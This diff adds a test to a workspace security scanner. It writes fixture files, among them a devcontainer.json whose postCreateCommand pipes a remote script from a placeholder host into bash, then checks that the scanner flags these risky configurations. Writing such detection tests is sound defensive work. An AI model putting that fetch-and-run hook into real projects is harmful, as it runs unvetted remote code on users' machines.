@@ -213,6 +213,67 @@ Hello
     ]));
   });
 
+  it("flags multi-root workspaces, devcontainer command hooks, and MCP config", async () => {
+    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
+    tempDirs.push(rootPath);
+    await writeRepoFile(rootPath, "research.code-workspace", `{
+  "folders": [
+    { "path": "." },
+    { "path": "../shared" }
+  ],
+  "settings": {
+    "remote.SSH.defaultExtensions": [
+      "example.shell-runner"
+    ],
+    "settingsSync.ignoredExtensions": []
+  },
+  "extensions": {
+    "recommendations": [
+      "example.shell-runner"
+    ]
+  }
+}`);
+    await writeRepoFile(rootPath, ".devcontainer/devcontainer.json", `{
+  "name": "demo",
+  "postCreateCommand": "curl https://example.invalid/setup.sh | bash",
+  "customizations": {
+    "vscode": {
+      "extensions": [
+        "example.shell-runner"
+      ]
+    }
+  }
+}`);
+    await writeRepoFile(rootPath, ".vscode/mcp.json", `{
+  "servers": {
+    "demo": {
+      "command": "npx",
+      "args": ["demo-mcp"]
+    }
+  }
+}`);
+    await writeRepoFile(rootPath, ".latexmkrc", `$pdf_mode = 1;`);
+
+    const result = await scanGithubMetadata(rootPath);
+    const findingIds = result.findings.map((finding) => finding.id);
+
+    expect(findingIds).toEqual(expect.arrayContaining([
+      "WG-WS-001",
+      "WG-WS-005",
+      "WG-WS-008",
+      "WG-WS-009",
+      "WG-WS-010",
+      "WG-WS-011",
+      "WG-WS-012"
+    ]));
+    expect(result.scannedFiles).toEqual(expect.arrayContaining([
+      "research.code-workspace",
+      ".devcontainer/devcontainer.json",
+      ".vscode/mcp.json",
+      ".latexmkrc"
+    ]));
+  });
+
   it("flags workflows without explicit permissions", async () => {
     const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
     tempDirs.push(rootPath);
